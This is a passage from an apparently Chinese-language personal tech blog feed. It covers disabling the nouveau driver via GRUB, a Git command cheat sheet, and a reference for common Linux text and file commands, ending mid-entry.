kernel initramfs:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo update-initramfs -u</span><br></code></pre></td></tr></table></figure><p>4.重启，然后 lsmod  | grep nouveau ，还是有该模块。失败</p><h2 id="0x02配置grub禁用启动项"><a href="#0x02配置grub禁用启动项" class="headerlink" title="0x02配置grub禁用启动项"></a>0x02配置grub禁用启动项</h2><p>最后迫于尝试了查到的方法都不是很靠谱，咨询了一下开源社区的学长们，给出了解决方案成功了，此时还是处于level3文字界面的。</p><p>1.增加内核参数禁用</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo nano <span class="hljs-regexp">/etc/</span>default/grub<br><span class="hljs-comment">#增加modprobe.blacklist=nouveau</span><br>GRUB_CMDLINE_LINUX_DEFAULT=<span class="hljs-string">&quot;modprobe.blacklist=nouveau&quot;</span><br></code></pre></td></tr></table></figure><p>modprobe用于向Linux Kernel添加 或 移除 kernel modules。 kernel modules以.ko作为扩展名。 </p><p>这里是增加了一个黑名单，在grub时禁用掉该模块。</p><p>2.重新新生成配置</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo grub-<span class="hljs-keyword">install</span><br></code></pre></td></tr></table></figure><p>3.重启后 lsmod  | grep nouveau便发现没有了这个模块，然后成功安装了英伟达的驱动。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>据学长所说，好像新内核是builtin的了，所以需要在grub里边禁用，对Linux的学习之路任重道远啊！</p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux kernel</tag>
      
      <tag>NVIDIA driver</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Git的使用</title>
    <link href="/blog/2020/09/19/Git%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/blog/2020/09/19/Git%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>闲着也是闲着，学习一下程序员必备工具Git的使用方法吧。</p><p><img src="/images/fj54.jpg"></p><span id="more"></span><h2 id="简易指南"><a href="#简易指南" class="headerlink" title="简易指南"></a>简易指南</h2><p><a href="https://www.bootcss.com/p/git-guide/">https://www.bootcss.com/p/git-guide/</a></p><h2 id="ProGit"><a href="#ProGit" class="headerlink" title="ProGit"></a>ProGit</h2><p><a href="https://www.progit.cn/">https://www.progit.cn/</a></p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>Git常用操作命令：</p><ol><li>远程仓库相关命令</li></ol><p>检出仓库：$ git clone git:&#x2F;&#x2F;github.com&#x2F;jquery&#x2F;jquery.git</p><p>查看远程仓库：$ git remote -v</p><p>添加远程仓库：$ git remote add [name] [url]</p><p>删除远程仓库：$ git remote rm [name]</p><p>修改远程仓库：$ git remote set-url –push [name] [newUrl]</p><p>拉取远程仓库：$ git pull [remoteName] [localBranchName]</p><p>推送远程仓库：$ git push [remoteName] [localBranchName]</p><p>*如果想把本地的某个分支test提交到远程仓库，并作为远程仓库的master分支，或者作为另外一个名叫test的分支，如下：</p><p>$git push origin test:master         &#x2F;&#x2F; 提交本地test分支作为远程的master分支</p><p>$git push origin test:test              &#x2F;&#x2F; 提交本地test分支作为远程的test分支</p><p>2）分支(branch)操作相关命令</p><p>查看本地分支：$ git branch</p><p>查看远程分支：$ git branch -r</p><p>创建本地分支：$ git branch [name] —-注意新分支创建后不会自动切换为当前分支</p><p>切换分支：$ git checkout [name]</p><p>创建新分支并立即切换到新分支：$ git checkout -b [name]</p><p>删除分支：$ git branch -d [name] —- -d选项只能删除已经参与了合并的分支，对于未有合并的分支是无法删除的。如果想强制删除一个分支，可以使用-D选项</p><p>合并分支：$ git merge [name] —-将名称为[name]的分支与当前分支合并</p><p>创建远程分支(本地分支push到远程)：$ git push origin [name]</p><p>删除远程分支：$ git push origin :heads&#x2F;[name] 或 $ gitpush origin :[name] </p><p>*创建空的分支：(执行命令之前记得先提交你当前分支的修改，否则会被强制删干净没得后悔)</p><p>$git symbolic-ref HEAD refs&#x2F;heads&#x2F;[name]</p><p>$rm .git&#x2F;index</p><p>$git clean -fdx</p><p>3）版本(tag)操作相关命令</p><p>查看版本：$ git tag</p><p>创建版本：$ git tag [name]</p><p>删除版本：$ git tag -d [name]</p><p>查看远程版本：$ git tag -r</p><p>创建远程版本(本地版本push到远程)：$ git push origin [name]</p><p>删除远程版本：$ git push origin :refs&#x2F;tags&#x2F;[name]</p><p>合并远程仓库的tag到本地：$ git pull origin –tags</p><p>上传本地tag到远程仓库：$ git push origin –tags</p><p>创建带注释的tag：$ git tag -a [name] -m ‘yourMessage’</p><ol start="4"><li>子模块(submodule)相关操作命令</li></ol><p>添加子模块：$ git submodule add [url] [path]</p><p>   如：$git submodule add git:&#x2F;&#x2F;github.com&#x2F;soberh&#x2F;ui-libs.git src&#x2F;main&#x2F;webapp&#x2F;ui-libs</p><p>初始化子模块：$ git submodule init  —-只在首次检出仓库时运行一次就行</p><p>更新子模块：$ git submodule update —-每次更新或切换分支后都需要运行一下</p><p>删除子模块：（分4步走哦）</p><ol><li><p>$ git rm –cached [path]</p></li><li><p>编辑“.gitmodules”文件，将子模块的相关配置节点删除掉</p></li><li><p>编辑“ .git&#x2F;config”文件，将子模块的相关配置节点删除掉</p></li><li><p>手动删除子模块残留的目录</p></li></ol><p>5）忽略一些文件、文件夹不提交</p><p>在仓库根目录下创建名称为“.gitignore”的文件，写入不需要的文件夹名或文件，每个元素占一行即可，如</p><p>target</p><p>bin</p><p>*.db</p><h3 id="Git命令参考手册-文本版"><a href="#Git命令参考手册-文本版" class="headerlink" title="Git命令参考手册(文本版)"></a>Git命令参考手册(文本版)</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs perl">git init                                                  <span class="hljs-comment"># 初始化本地git仓库（创建新仓库） </span><br>git config --global user.name <span class="hljs-string">&quot;xxx&quot;</span>                       <span class="hljs-comment"># 配置用户名 </span><br>git config --global user.email <span class="hljs-string">&quot;xxx@xxx.com&quot;</span>              <span class="hljs-comment"># 配置邮件 </span><br>git config --global color.ui true                         <span class="hljs-comment"># git status等命令自动着色 </span><br>git config --global color.status auto <br>git config --global color.diff auto <br>git config --global color.branch auto <br>git config --global color.interactive auto <br>git clone git+ssh:<span class="hljs-regexp">//gi</span>t@192.<span class="hljs-number">168.53</span>.<span class="hljs-number">168</span>/VT.git             <span class="hljs-comment"># clone远程仓库 </span><br>git status                                                <span class="hljs-comment"># 查看当前版本状态（是否修改） </span><br>git add xyz                                               <span class="hljs-comment"># 添加xyz文件至index </span><br>git add .                                                 <span class="hljs-comment"># 增加当前子目录下所有更改过的文件至index </span><br>git commit -m <span class="hljs-string">&#x27;xxx&#x27;</span>                                       <span class="hljs-comment"># 提交 </span><br>git commit --amend -m <span class="hljs-string">&#x27;xxx&#x27;</span>                               <span class="hljs-comment"># 合并上一次提交（用于反复修改） </span><br>git commit -am <span class="hljs-string">&#x27;xxx&#x27;</span>                                      <span class="hljs-comment"># 将add和commit合为一步 </span><br>git rm xxx                                                <span class="hljs-comment"># 删除index中的文件 </span><br>git rm -r *                                               <span class="hljs-comment"># 递归删除 </span><br>git <span class="hljs-keyword">log</span>                                                   <span class="hljs-comment"># 显示提交日志 </span><br>git <span class="hljs-keyword">log</span> -<span class="hljs-number">1</span>                                                <span class="hljs-comment"># 显示1行日志 -n为n行 </span><br>git <span class="hljs-keyword">log</span> -<span class="hljs-number">5</span><br>git <span class="hljs-keyword">log</span> --<span class="hljs-keyword">stat</span>                                            <span class="hljs-comment"># 显示提交日志及相关变动文件 </span><br>git <span class="hljs-keyword">log</span> -p -m <br>git show dfb02e6e4f2f7b573337763e5c0013802e392818         <span class="hljs-comment"># 显示某个提交的详细内容 </span><br>git show dfb02                                            <span class="hljs-comment"># 可只用commitid的前几位 </span><br>git show HEAD                                             <span class="hljs-comment"># 显示HEAD提交日志 </span><br>git show HEAD^                                            <span class="hljs-comment"># 显示HEAD的父（上一个版本）的提交日志 ^^为上两个版本 ^5为上5个版本 </span><br>git tag                                                   <span class="hljs-comment"># 显示已存在的tag </span><br>git tag -a v2.<span class="hljs-number">0</span> -m <span class="hljs-string">&#x27;xxx&#x27;</span>                                  <span class="hljs-comment"># 增加v2.0的tag </span><br>git show v2.<span class="hljs-number">0</span>                                             <span class="hljs-comment"># 显示v2.0的日志及详细内容 </span><br>git <span class="hljs-keyword">log</span> v2.<span class="hljs-number">0</span>                                              <span class="hljs-comment"># 显示v2.0的日志 </span><br>git diff                                                  <span class="hljs-comment"># 显示所有未添加至index的变更 </span><br>git diff --cached                                         <span class="hljs-comment"># 显示所有已添加index但还未commit的变更 </span><br>git diff HEAD^                                            <span class="hljs-comment"># 比较与上一个版本的差异 </span><br>git diff HEAD -- ./lib                                    <span class="hljs-comment"># 比较与HEAD版本lib目录的差异 </span><br>git diff origin/master..master                            <span class="hljs-comment"># 比较远程分支master上有本地分支master上没有的 </span><br>git diff origin/master..master --<span class="hljs-keyword">stat</span>                     <span class="hljs-comment"># 只显示差异的文件，不显示具体内容 </span><br>git remote add origin git+ssh:<span class="hljs-regexp">//gi</span>t@192.<span class="hljs-number">168.53</span>.<span class="hljs-number">168</span>/VT.git <span class="hljs-comment"># 增加远程定义（用于push/pull/fetch） </span><br>git branch                                                <span class="hljs-comment"># 显示本地分支 </span><br>git branch --contains <span class="hljs-number">50089</span>                               <span class="hljs-comment"># 显示包含提交50089的分支 </span><br>git branch -a                                             <span class="hljs-comment"># 显示所有分支 </span><br>git branch -r                                             <span class="hljs-comment"># 显示所有原创分支 </span><br>git branch --merged                                       <span class="hljs-comment"># 显示所有已合并到当前分支的分支 </span><br>git branch --<span class="hljs-keyword">no</span>-merged                                    <span class="hljs-comment"># 显示所有未合并到当前分支的分支 </span><br>git branch -m master master_copy                          <span class="hljs-comment"># 本地分支改名 </span><br>git checkout -b master_copy                               <span class="hljs-comment"># 从当前分支创建新分支master_copy并检出 </span><br>git checkout -b master master_copy                        <span class="hljs-comment"># 上面的完整版 </span><br>git checkout features/performance                         <span class="hljs-comment"># 检出已存在的features/performance分支 </span><br>git checkout --track hotfixes/BJVEP933                    <span class="hljs-comment"># 检出远程分支hotfixes/BJVEP933并创建本地跟踪分支</span><br>git checkout v2.<span class="hljs-number">0</span>                                         <span class="hljs-comment"># 检出版本v2.0</span><br>git checkout -b devel origin/develop                      <span class="hljs-comment"># 从远程分支develop创建新本地分支devel并检出 </span><br>git checkout -- README                                    <span class="hljs-comment"># 检出head版本的README文件（可用于修改错误回退） </span><br>git merge origin/master                                   <span class="hljs-comment"># 合并远程master分支至当前分支 </span><br>git cherry-pick ff44785404a8e                             <span class="hljs-comment"># 合并提交ff44785404a8e的修改 </span><br>git <span class="hljs-keyword">push</span> origin master                                    <span class="hljs-comment"># 将当前分支push到远程master分支 </span><br>git <span class="hljs-keyword">push</span> origin :hotfixes/BJVEP933                        <span class="hljs-comment"># 删除远程仓库的hotfixes/BJVEP933分支 </span><br>git <span class="hljs-keyword">push</span> --tags                                           <span class="hljs-comment"># 把所有tag推送到远程仓库 </span><br>git fetch                                                 <span class="hljs-comment"># 获取所有远程分支（不更新本地分支，另需merge） </span><br>git fetch --prune                                         <span class="hljs-comment"># 获取所有原创分支并清除服务器上已删掉的分支 </span><br>git pull origin master                                    <span class="hljs-comment"># 获取远程分支master并merge到当前分支 </span><br>git mv README README2                                     <span class="hljs-comment"># 重命名文件README为README2 </span><br>git <span class="hljs-keyword">reset</span> --hard HEAD                                     <span class="hljs-comment"># 将当前版本重置为HEAD（通常用于merge失败回退） </span><br>git rebase <br>git branch -d hotfixes/BJVEP933                           <span class="hljs-comment"># 删除分支hotfixes/BJVEP933（本分支修改已合并到其他分支） </span><br>git branch -D hotfixes/BJVEP933                           <span class="hljs-comment"># 强制删除分支hotfixes/BJVEP933 </span><br>git ls-files                                              <span class="hljs-comment"># 列出git index包含的文件 </span><br>git show-branch                                           <span class="hljs-comment"># 图示当前分支历史 </span><br>git show-branch --all                                     <span class="hljs-comment"># 图示所有分支历史 </span><br>git whatchanged                                           <span class="hljs-comment"># 显示提交历史对应的文件修改 </span><br>git revert dfb02e6e4f2f7b573337763e5c0013802e392818       <span class="hljs-comment"># 撤销提交dfb02e6e4f2f7b573337763e5c0013802e392818 </span><br>git ls-tree HEAD                                          <span class="hljs-comment"># 内部命令：显示某个git对象 </span><br>git rev-parse v2.<span class="hljs-number">0</span>                                        <span class="hljs-comment"># 内部命令：显示某个ref对于的SHA1 HASH </span><br>git reflog                                                <span class="hljs-comment"># 显示所有提交，包括孤立节点 </span><br>git show HEAD@&#123;5&#125; <br>git show master@&#123;yesterday&#125;                               <span class="hljs-comment"># 显示master分支昨天的状态 </span><br>git <span class="hljs-keyword">log</span> --pretty=<span class="hljs-keyword">format</span>:<span class="hljs-string">&#x27;%h %s&#x27;</span> --graph                   <span class="hljs-comment"># 图示提交日志 </span><br>git show HEAD~<span class="hljs-number">3</span><br>git show -s --pretty=raw <span class="hljs-number">2</span>be7fcb476 <br>git stash                                                 <span class="hljs-comment"># 暂存当前修改，将所有至为HEAD状态 </span><br>git stash list                                            <span class="hljs-comment"># 查看所有暂存 </span><br>git stash show -p stash@&#123;0&#125;                               <span class="hljs-comment"># 参考第一次暂存 </span><br>git stash apply stash@&#123;0&#125;                                 <span class="hljs-comment"># 应用第一次暂存 </span><br>git <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;delete from&quot;</span>                                    <span class="hljs-comment"># 文件中搜索文本“delete from” </span><br>git <span class="hljs-keyword">grep</span> -e <span class="hljs-string">&#x27;#define&#x27;</span> --<span class="hljs-keyword">and</span> -e SORT_DIRENT <br>git gc <br>git fsck<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux常用命令学习</title>
    <link href="/blog/2020/09/03/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/"/>
    <url>/blog/2020/09/03/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>最近闲来无事，系统的学习记录一下Linux的一些命令，方便以熟练的使用Linux系统。</strong></p><p><img src="/%5Cimages%5Cfj53.jpg"></p><span id="more"></span><h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><h3 id="文件查看"><a href="#文件查看" class="headerlink" title="文件查看"></a>文件查看</h3><h4 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h4><p>cat 命令用于连接文件并打印到标准输出设备上。</p><p><strong>语法格式：</strong>cat [-AbeEnstTuv] [–help] [–version] fileName</p><p><strong>参数说明：</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">-n 或 <span class="hljs-attr">--number</span>：由 <span class="hljs-number">1</span> 开始对所有输出的行数编号。<br>-<span class="hljs-selector-tag">b</span> 或 <span class="hljs-attr">--number-nonblank</span>：和 -n 相似，只不过对于空白行不编号。<br>-s 或 <span class="hljs-attr">--squeeze-blank</span>：当遇到有连续两行以上的空白行，就代换为一行的空白行。<br>-v 或 <span class="hljs-attr">--show-nonprinting</span>：使用 ^ 和 M- 符号，除了 LFD 和 TAB 之外。<br>-E 或 <span class="hljs-attr">--show-ends</span> : 在每行结束处显示 $。<br>-T 或 <span class="hljs-attr">--show-tabs</span>: 将 TAB 字符显示为 ^I。<br>-A, <span class="hljs-attr">--show-all</span>：等价于 -vET。<br></code></pre></td></tr></table></figure><h4 id="more"><a href="#more" class="headerlink" title="more"></a>more</h4><p>Linux more 命令类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似），使用中的说明文件，请按 h 。</p><p>语法：more [-dlfpcsu] [-num] [+&#x2F;pattern] [+linenum] [fileNames..]</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-num 一次显示的行数</span><br><span class="hljs-deletion">-d 提示使用者，在画面下方显示 [Press space to continue, &#x27;q&#x27; to quit.] ，如果使用者按错键，则会显示 [Press &#x27;h&#x27; for instructions.] 而不是 &#x27;哔&#x27; 声</span><br><span class="hljs-deletion">-l 取消遇见特殊字元 ^L（送纸字元）时会暂停的功能</span><br><span class="hljs-deletion">-f 计算行数时，以实际上的行数，而非自动换行过后的行数（有些单行字数太长的会被扩展为两行或两行以上）</span><br><span class="hljs-deletion">-p 不以卷动的方式显示每一页，而是先清除萤幕后再显示内容</span><br><span class="hljs-deletion">-c 跟 -p 相似，不同的是先显示内容再清除其他旧资料</span><br><span class="hljs-deletion">-s 当遇到有连续两行以上的空白行，就代换为一行的空白行</span><br><span class="hljs-deletion">-u 不显示下引号 （根据环境变数 TERM 指定的 terminal 而有所不同）</span><br><span class="hljs-addition">+/pattern 在每个文档显示前搜寻该字串（pattern），然后从该字串之后开始显示</span><br><span class="hljs-addition">+num 从第 num 行开始显示</span><br>fileNames 欲显示内容的文档，可为复数个数<br></code></pre></td></tr></table></figure><h4 id="less"><a href="#less" class="headerlink" title="less"></a>less</h4><p>less 与 more 类似，但使用 less 可以随意浏览文件，而 more 仅能向前移动，却不能向后移动，而且 less 在查看之前不会加载整个文件。</p><p>语法：less [参数] 文件</p><p>参数：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm">-<span class="hljs-keyword">b</span> &lt;缓冲区大小&gt; 设置缓冲区的大小<br>/字符串：向下搜索<span class="hljs-string">&quot;字符串&quot;</span>的功能<br>?字符串：向上搜索<span class="hljs-string">&quot;字符串&quot;</span>的功能<br>空格键 滚动一页<br>回车键 滚动一行<br></code></pre></td></tr></table></figure><h3 id="文档编辑"><a href="#文档编辑" class="headerlink" title="文档编辑"></a>文档编辑</h3><p>基础的vim、nano等文本编辑器不再赘述</p><h4 id="tr"><a href="#tr" class="headerlink" title="tr"></a>tr</h4><p>Linux tr 命令用于转换或删除文件中的字符。<br>tr 指令从标准输入设备读取数据，经过字符串转译后，将结果输出到标准输出设备。</p><p>语法：</p><p>tr [-cdst][–help][–version][第一字符集][第二字符集]<br>tr [OPTION]…SET1[SET2]</p><p>参数：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ada">-c, <span class="hljs-comment">--complement：反选设定字符。也就是符合 SET1 的部份不做处理，不符合的剩余部份才进行转换 </span><br>-d, <span class="hljs-comment">--delete：删除指令字符</span><br>-s, <span class="hljs-comment">--squeeze-repeats：缩减连续重复的字符成指定的单个字符</span><br>-t, <span class="hljs-comment">--truncate-set1：削减 SET1 指定范围，使之与 SET2 设定长度相等</span><br><span class="hljs-comment">--help：显示程序用法信息</span><br><span class="hljs-comment">--version：显示程序本身的版本信息 </span><br></code></pre></td></tr></table></figure><h4 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h4><p>Linux sort命令用于将文本文件内容加以排序。<br>sort可针对文本文件的内容，以行为单位来排序。</p><p>语法：</p><p>sort [-bcdfimMnr][-o&lt;输出文件&gt;][-t&lt;分隔字符&gt;][+&lt;起始栏位&gt;-&lt;结束栏位&gt;][–help][–verison][文件]</p><p>参数：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-b 忽略每行前面开始出的空格字符。</span><br><span class="hljs-deletion">-c 检查文件是否已经按照顺序排序。</span><br><span class="hljs-deletion">-d 排序时，处理英文字母、数字及空格字符外，忽略其他的字符。</span><br><span class="hljs-deletion">-f 排序时，将小写字母视为大写字母。</span><br><span class="hljs-deletion">-i 排序时，除了040至176之间的ASCII字符外，忽略其他的字符。</span><br><span class="hljs-deletion">-m 将几个排序好的文件进行合并。</span><br><span class="hljs-deletion">-M 将前面3个字母依照月份的缩写进行排序。</span><br><span class="hljs-deletion">-n 依照数值的大小排序。</span><br><span class="hljs-deletion">-u 意味着是唯一的(unique)，输出的结果是去完重了的。</span><br><span class="hljs-deletion">-o&lt;输出文件&gt; 将排序后的结果存入指定的文件。</span><br><span class="hljs-deletion">-r 以相反的顺序来排序。</span><br></code></pre></td></tr></table></figure><h4 id="col"><a href="#col" class="headerlink" title="col"></a>col</h4><p>Linux col命令用于过滤控制字符。<br>在许多UNIX说明文件里，都有RLF控制字符。当我们运用shell特殊字符”&gt;”和”&gt;&gt;”，把说明文件的内容输出成纯文本文件时，控制字符会变成乱码，col指令则能有效滤除这些控制字符。</p><p>语法：</p><p>col [-bfx][-l&lt;缓冲区列数&gt;]</p><h4 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h4><p>Linux sed 命令是利用脚本来处理文本文件。<br>sed 可依照脚本的指令来处理、编辑文本文件。<br>Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sed <span class="hljs-selector-attr">[-hnV]</span><span class="hljs-selector-attr">[-e&lt;script&gt;]</span><span class="hljs-selector-attr">[-f&lt;script文件&gt;]</span><span class="hljs-selector-attr">[文本文件]</span><br></code></pre></td></tr></table></figure><p>参数说明：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">参数说明：<br>-e&lt;script&gt;或<span class="hljs-attr">--expression</span>=&lt;script&gt; 以选项中指定的script来处理输入的文本文件。<br>-f&lt;script文件&gt;或<span class="hljs-attr">--file</span>=&lt;script文件&gt; 以选项中指定的script文件来处理输入的文本文件。<br>-h或<span class="hljs-attr">--help</span> 显示帮助。<br>-n或<span class="hljs-attr">--quiet</span>或<span class="hljs-attr">--silent</span> 仅显示script处理后的结果。<br>-V或<span class="hljs-attr">--version</span> 显示版本信息。<br>动作说明：<br><span class="hljs-selector-tag">a</span> ：新增， <span class="hljs-selector-tag">a</span> 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～<br>c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！<br>d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚；<br><span class="hljs-selector-tag">i</span> ：插入， <span class="hljs-selector-tag">i</span> 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；<br><span class="hljs-selector-tag">p</span> ：打印，亦即将某个选择的数据印出。通常 <span class="hljs-selector-tag">p</span> 会与参数 sed -n 一起运行～<br>s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 <span class="hljs-number">1</span>,<span class="hljs-number">20s</span>/old/new/g 就是啦！ <br></code></pre></td></tr></table></figure><h3 id="文件管理-1"><a href="#文件管理-1" class="headerlink" title="文件管理"></a>文件管理</h3><h4 id="chattr"><a href="#chattr" class="headerlink" title="chattr"></a>chattr</h4><p>Linux chattr命令用于改变文件属性。<br>这项指令可改变存放在ext2文件系统上的文件或目录属性，这些属性共有以下8种模式：<br>a：让文件或目录仅供附加用途。<br>b：不更新文件或目录的最后存取时间。<br>c：将文件或目录压缩后存放。<br>d：将文件或目录排除在倾倒操作之外。<br>i：不得任意更动文件或目录。<br>s：保密性删除文件或目录。<br>S：即时更新文件或目录。<br>u：预防意外删除。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">chattr <span class="hljs-selector-attr">[-RV]</span><span class="hljs-selector-attr">[-v&lt;版本编号&gt;]</span><span class="hljs-selector-attr">[+/-/=&lt;属性&gt;]</span><span class="hljs-selector-attr">[文件或目录...]</span><br></code></pre></td></tr></table></figure><p>参数：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">　　-R 递归处理，将指定目录下的所有文件及子目录一并处理。<br>　　-v<span class="hljs-tag">&lt;<span class="hljs-name">版本编号</span>&gt;</span> 设置文件或目录版本。<br>　　-V 显示指令执行过程。<br>　　+<span class="hljs-tag">&lt;<span class="hljs-name">属性</span>&gt;</span> 开启文件或目录的该项属性。<br>　　-<span class="hljs-tag">&lt;<span class="hljs-name">属性</span>&gt;</span> 关闭文件或目录的该项属性。<br>　　=<span class="hljs-tag">&lt;<span class="hljs-name">属性</span>&gt;</span> 指定文件或目录的该项属性。<br></code></pre></td></tr></table></figure><h4 id="chgrp"><a href="#chgrp" class="headerlink" title="chgrp"></a>chgrp</h4><p>Linux chgrp命令用于变更文件或目录的所属群组。<br>在UNIX系统家族里，文件或目录权限的掌控以拥有者及所属群组来管理。您可以使用chgrp指令去变更文件与目录的所属群组，设置方式采用群组名称或群组识别码皆可。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">chgrp <span class="hljs-selector-attr">[-cfhRv]</span><span class="hljs-selector-attr">[--help]</span><span class="hljs-selector-attr">[--version]</span><span class="hljs-selector-attr">[所属群组]</span><span class="hljs-selector-attr">[文件或目录...]</span> 或 chgrp <span class="hljs-selector-attr">[-cfhRv]</span><span class="hljs-selector-attr">[--help]</span><span class="hljs-selector-attr">[--reference=&lt;参考文件或目录&gt;]</span><span class="hljs-selector-attr">[--version]</span><span class="hljs-selector-attr">[文件或目录...]</span><br></code></pre></td></tr></table></figure><h4 id="chown"><a href="#chown" class="headerlink" title="chown"></a>chown</h4><p>利用 chown 将指定文件的拥有者改为指定的用户或组，用户可以是用户名或者用户ID；组可以是组名或者组ID；文件是以空格分开的要改变权限的文件列表，支持通配符。 。<br>一般来说，这个指令只有是由系统管理者(root)所使用，一般使用者没有权限可以改变别人的文件拥有者，也没有权限把自己的文件拥有者改设为别人。只有系统管理者(root)才有这样的权限。</p><p>语法：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">chown [-cfhvR] [--help] [--version] user[:group] file...<br></code></pre></td></tr></table></figure><p>参数：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 